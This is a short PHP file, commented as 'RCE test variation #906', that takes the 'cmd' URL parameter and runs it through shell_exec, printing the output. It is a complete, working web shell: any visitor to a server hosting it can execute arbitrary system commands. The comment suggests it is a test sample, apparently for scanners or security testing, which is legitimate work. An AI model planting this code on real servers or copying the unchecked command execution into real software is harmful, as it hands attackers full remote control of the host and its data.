<?php
// RCE test variation #906
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>